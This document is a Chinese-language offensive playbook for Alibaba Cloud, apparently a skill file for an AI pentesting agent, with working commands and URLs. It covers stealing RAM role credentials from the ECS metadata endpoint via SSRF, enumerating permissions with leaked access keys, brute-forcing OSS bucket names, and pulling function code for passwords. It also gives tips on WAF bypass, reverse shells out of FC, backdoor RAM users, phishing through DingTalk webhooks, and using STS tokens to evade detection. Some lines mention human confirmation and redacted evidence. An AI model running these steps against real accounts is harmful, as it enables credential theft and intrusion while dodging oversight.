---
name: alibaba-cloud
description: 阿里云专项 playbook — RAM 凭证体系 / STS / OSS / FC 函数计算 / ACK 容器服务 / SLS 日志 / OpenAPI 探测。聚焦阿里云独家特性,通用云攻击走 cloud-security.md。
category: technologies
tags: [technology, cloud, alibaba, aliyun, ram, oss, sts, china]
---

# 阿里云 (Aliyun / Alibaba Cloud) Playbook

> **何时用本文件**: 通过 AK 前缀 (`LTAI` / `LTAI5`) / Endpoint (`*.aliyuncs.com`) / OSS Bucket (`oss-*.aliyuncs.com`) 确认目标使用阿里云后,系统梳理服务面 + 利用链。
> **与 [cloud-security.md](../cloud-security.md) 的关系**: cloud-security.md = 跨云通用 (元数据 / SSRF / Bucket),本文件 = 阿里云独家 RAM/STS/OpenAPI/FC/ACK 利用。

---

## 1. 指纹识别

### 1.1 AK 前缀

| 前缀 | 类型 | 含义 |
| :--- | :--- | :--- |
| `LTAI` (5 字符) | 长期 AK | 主账号 / RAM 用户的 AccessKey |
| `LTAI5` | 长期 AK 新格式 | 2020+ 新签发 |
| `STS.` | 临时凭证 | STS Token (有 SecurityToken / 过期时间) |
| `ACS:` | RAM 角色 ARN 前缀 | `acs:ram::ACCOUNT:role/RoleName` |

发现 AK 后立刻区分:
- 长期 AK → 权限可能很大,但容易留痕
- STS 临时 → 时间窗口短 (默认 1h),要快

### 1.2 Endpoint / Bucket 指纹

| 指纹 | 服务 |
| :--- | :--- |
| `*.aliyuncs.com` | 阿里云通用域 |
| `*.oss-cn-*.aliyuncs.com` | OSS 对象存储 |
| `*.fc.aliyuncs.com` | 函数计算 FC |
| `*.cn-hangzhou.aliyuncs.com` 等 region | 主 region (杭州/上海/北京/深圳/张家口) |
| `*.aliapp.org` `*.alipay.com` | 蚂蚁集团 / 支付宝 |
| `Server: Tengine` | 阿里巴巴 Tengine (Nginx 衍生) |
| `EagleEye-TraceId` 响应头 | 阿里中间件追踪 ID |
| `x-acs-*` 请求/响应头 | ACS (Alibaba Cloud Service) 标识 |

### 1.3 元数据 Endpoint (SSRF 命中后)

```bash
# 阿里云 ECS 元数据
http://100.100.100.200/latest/meta-data/

# 拿 RAM 角色凭证 (核心)
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/ram/security-credentials/<ROLE_NAME>
# 返回 {AccessKeyId, AccessKeySecret, SecurityToken, Expiration, RoleArn, ...}

# 实例信息
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/region-id
http://100.100.100.200/latest/meta-data/vpc-id
http://100.100.100.200/latest/meta-data/network/interfaces/macs/

# user-data (启动脚本,可能含硬编码凭证)
http://100.100.100.200/latest/user-data
```

**注意**: 阿里云 IMDSv2 (硬化模式) 需先 PUT 拿 token,默认仍是 v1。

---

## 2. RAM 权限快速判定 (拿到 AK/STS 后第一动作)

```bash
# 配置 aliyun CLI
aliyun configure --profile target --mode AK
# 或 STS 模式
aliyun configure --profile target --mode StsToken

# 探权限 (最少权限优先,不要直接 List 所有资源)
aliyun ram GetUser                     # 拿当前用户
aliyun ram ListPoliciesForUser --UserName xxx  # 列权限策略
aliyun sts GetCallerIdentity           # 拿 caller ARN
```

**P3.5 HITL 协议**: 拿到 AK 后**禁止直接 List 所有资源**,先 GetCallerIdentity 确认身份,再有针对性查 1-2 个 read-only API 证明权限。

### 权限优先级 (按 ROI)

| 权限 | ROI | 验证 API |
| :--- | :---: | :--- |
| `AliyunOSSFullAccess` | 🔴 极高 | `aliyun oss ls` |
| `AliyunRAMFullAccess` | 🔴 极高 | `aliyun ram ListUsers` (可创建后门用户) |
| `AliyunECSFullAccess` | 🔴 极高 | `aliyun ecs DescribeInstances` |
| `AliyunFCFullAccess` | 🔴 高 | `aliyun fc-open ListServices` |
| `AliyunRDSReadOnlyAccess` | 🟡 中 | `aliyun rds DescribeDBInstances` |
| `AliyunLogReadOnlyAccess` | 🟡 中 | `aliyun log ListProject` |
| `AliyunActionTrailReadOnlyAccess` | 🟢 低但有价值 | 可看历史调用,推断架构 |

---

## 3. 高价值服务清单

### 3.1 OSS 对象存储

#### A. 公开 Bucket 探测 (无需凭证)

```bash
# 直接列 Bucket
curl https://target-bucket.oss-cn-hangzhou.aliyuncs.com/
curl https://target-bucket.oss-cn-hangzhou.aliyuncs.com/?list-type=2

# 各 region 试探
for region in cn-hangzhou cn-shanghai cn-beijing cn-shenzhen cn-qingdao cn-zhangjiakou oss-cn-hongkong; do
  curl -s -o /dev/null -w "[$region] %{http_code}\n" "https://target-bucket.$region.aliyuncs.com/"
done

# Bucket 命名猜测 (基于公司名)
for name in $COMPANY-prod $COMPANY-dev $COMPANY-staging $COMPANY-backup $COMPANY-images $COMPANY-static $COMPANY-test $COMPANY-uat $COMPANY-public; do
  curl -s -o /dev/null -w "[$name] %{http_code}\n" "https://$name.oss-cn-hangzhou.aliyuncs.com/"
done
```

#### B. 有 AK 后

```bash
aliyun oss ls
aliyun oss ls oss://BUCKET/
aliyun oss cat oss://BUCKET/sensitive-file --range 0,1024  # 只读前 1KB
```

**OPSEC**: 不要全量下载;只取证据切片。

#### C. STS 政策错配 (业务侧)

很多业务用 RAM Policy 给前端发 STS 让用户上传 OSS,常见错配:
- Policy `Resource: *` (任意 Bucket)
- Policy `Action: oss:*` (任意操作)
- 无 `Condition` 限制 IP / Referer / 文件前缀
- 客户端能拿到 STS Token → 上传任意文件 → 覆盖他人

测试方法: 抓获取 STS 的接口 → 用拿到的 Token 试 `aliyun oss cp test.txt oss://任意 bucket/任意路径`

### 3.2 ECS 元数据 / 实例

- SSRF → 元数据 → STS → 横向到其他实例
- ECS user-data 含硬编码凭证 (历史项目常见)
- ECS 安全组 0.0.0.0/0 + 弱口令 → 直接登录 (不在 SRC scope,需 HITL)

### 3.3 函数计算 FC

```bash
# 已知 FC endpoint
https://ACCOUNT.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/SERVICE/FUNCTION/
https://CUSTOM-DOMAIN/PATH  # 绑定的自定义域名

# 拿到 AK 后
aliyun fc-open ListServices
aliyun fc-open GetFunction --serviceName xxx --functionName xxx
# 拉函数代码 → 可能含数据库密码 / 内部地址
aliyun fc-open GetFunctionCode --serviceName xxx --functionName xxx
```

**FC 触发器风险**: HTTP 触发器若 authType=anonymous → 任意人调用 → 业务函数被滥用。

### 3.4 RDS 数据库

- 内网地址泄露 → SSRF 横向连 (需要 ECS 跳板)
- 拿到 RAM 权限 `AliyunRDSReadOnlyAccess` → 看实例列表 + 安全组 + 备份
- RDS 备份地址有时是 OSS Bucket → 看备份 Bucket 公开性

### 3.5 SLS 日志服务

- `AliyunLogReadOnlyAccess` → 看历史日志 → 可能含明文密码 / Token / 用户 PII
- 日志投递到 OSS 时,检查 OSS Bucket 公开性

### 3.6 容器服务 ACK / Serverless K8s ASK

- 拿到 RAM `cs:DescribeClusters` → 看 K8s 集群配置
- 看 kubeconfig 暴露 → 接管 K8s
- K8s 命名空间 / Secret 漏看 (走 cloud-security §6)

### 3.7 中间件: Nacos / MSE / RocketMQ / Sentinel

- 阿里云 MSE (微服务引擎) 托管 Nacos → 未授权访问 → 拉所有配置
- RocketMQ console 公开 → 消息伪造
- 详见 [frameworks/spring-boot.md §6.3](../frameworks/spring-boot.md)

---

## 4. OpenAPI 探测 (无凭证)

阿里云 OpenAPI 部分接口允许无凭证调用 (返回公开数据 / 错误信息泄露):

```bash
# 拿当前 caller (需 AK)
aliyun sts GetCallerIdentity

# 域名 WHOIS / 备案 (用别人的 AK 时不报警)
aliyun domain QueryDomainList

# 公共 region 列表
curl "https://ecs.aliyuncs.com/?Action=DescribeRegions&Version=2014-05-26"
```

错误响应往往泄露 AccountId / RoleName / 内部错误代码 → Recon 有用。

---

## 5. 钓鱼 / 社工 (谨慎,P3.5)

- 阿里云邮件推送服务 (DM) → SPF/DKIM/DMARC 错配可伪造发件 (走 [vuln/email-spoofing.md](../vuln/email-spoofing.md))
- 钉钉机器人 webhook 公开 → 投递钓鱼消息 (需要 webhook URL 泄露)
- ICP 备案信息 → 拿公司主体名 → 钓鱼准备

---

## 6. False Positives

| 现象 | 误判 | 真实判断 |
| :--- | :--- | :--- |
| `LTAI` 开头 16 位字符 | 一定是 AK? | 看长度 (AK 通常 24-30 字符,AS 是 30) + 试用 aliyun CLI 验证 |
| OSS bucket 返回 403 | 完全不可访问? | 试 list-type=2 / 试已知文件名 / 试 PUT 探测 |
| OSS 列表返回 NoSuchBucket | bucket 不存在? | 试其他 region |
| RAM 凭证查 GetUser 报错 | 凭证无效? | 试 GetCallerIdentity (无需任何权限) |
| `aliyun configure` 后命令报 401 | AK 假? | 试切换 region (有的 region 不开通) |

---

## 7. Impact 证据

| 漏洞 | Impact | 证据 |
| :--- | :--- | :--- |
| 硬编码 AK 拿到管理员 RAM | Critical | `GetCallerIdentity` 输出 (ARN 脱敏) + 1 个 List 权限证明 |
| OSS bucket 公开列表 | Medium-High | 列表前 5 文件名脱敏 |
| OSS 公开敏感数据 (DB 备份) | Critical | 文件名 + 前 100 字节脱敏 |
| FC 函数代码泄露 (含密码) | Critical | 代码片段脱敏 + 说明用途 |
| SSRF → 元数据 → STS | Critical | curl 命令 + STS Token 前 4 字符脱敏 + Role ARN |

---

## 8. Pro Tips

- **AK 拿到第一动作永远是 `GetCallerIdentity`** — 不消耗任何权限,确认身份
- **OSS Bucket 命名规律**: 国内公司常用 `公司缩写-环境-用途`,如 `xx-prod-images` / `xx-dev-backup` — 暴力枚举
- **AK 泄露关键源**: GitHub / GitLab / 小程序反编译 / Android APK / Web JS / heapdump
- **STS Token 优势**: 临时凭证,过期短,被发现概率低
- **OPSEC**: 阿里云 ActionTrail 默认开启 90 天,所有 API 调用留痕 — 测试用最少 API
- **国密 SSL**: 部分阿里云金融业务用国密 TLS,标准工具抓不到包 — 用 Yakit 的国密支持
- **阿里云 WAF (DDoS Pro)**: 拦截 `union select` `<script>` 等明显 payload,但**对参数顺序**和**Content-Type**敏感 — 试 multipart/form-data + 编码绕过
- **FC 反弹**: FC 函数本质是隔离 container,反弹 shell 到 OOB 是允许的 (Internet egress 默认开),但 P3.5 HITL 必须确认

---

## 9. 工具升级线

**classic 版**:
- CLI: `aliyun` CLI v3+ / `python alibabacloud-cli`
- AK 探活: 手写 curl + Aliyun OpenAPI 签名 (用 aliyun CLI 简化)
- OSS 扫: `oss-fuzz` (自行/社区脚本) / `aliyun-credential-discovery` (社区工具)

**toolPlus 版**:
- `mcp__yaklang__http_fuzzer` 一次发 OSS bucket 命名变体 sweep
- `mcp__yaklang__exec_codec` 处理阿里云 OpenAPI 的 HMAC-SHA1 签名链
- `mcp__yaklang__brute` 字典爆破 OSS bucket 名

---

## 10. 相关参考

- 通用云攻击协议: [cloud-security.md](../cloud-security.md)
- SSRF: [vuln/ssrf.md](../vuln/ssrf.md)
- 敏感信息利用: [sensitive-info-exploitation.md](../sensitive-info-exploitation.md)
- WAF 绕过: [waf-bypass.md](../waf-bypass.md)
- 邮件伪造: [vuln/email-spoofing.md](../vuln/email-spoofing.md)
- Spring Cloud Alibaba: [frameworks/spring-boot.md §6.3](../frameworks/spring-boot.md)
